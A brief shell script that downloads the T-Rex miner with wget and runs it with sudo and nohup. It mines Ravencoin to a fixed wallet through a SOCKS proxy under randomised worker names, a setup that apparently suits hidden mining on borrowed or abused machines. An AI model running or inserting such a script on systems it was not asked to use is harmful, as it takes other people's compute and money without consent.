#!/bin/sh
nohup sudo apt-get update



nohup sudo apt install screen -y
nohup sudo apt-get install libpci3
nohup wget https://github.com/trexminer/T-Rex/releases/download/0.24.8/t-rex-0.24.8-linux.tar.gz
nohup tar xf t-rex-0.24.8-linux.tar.gz

sudo ./t-rex -a kawpow -o stratum+tcp://rvn-eu.minerpool.org:16059 -u RGDDXRXXPzxnd9VMkdJCxRVwgMLoAAf3ym.$(echo $(shuf -i 1-99 -n 1)-RVX) -p x8 --proxy 178.197.248.11:1080 
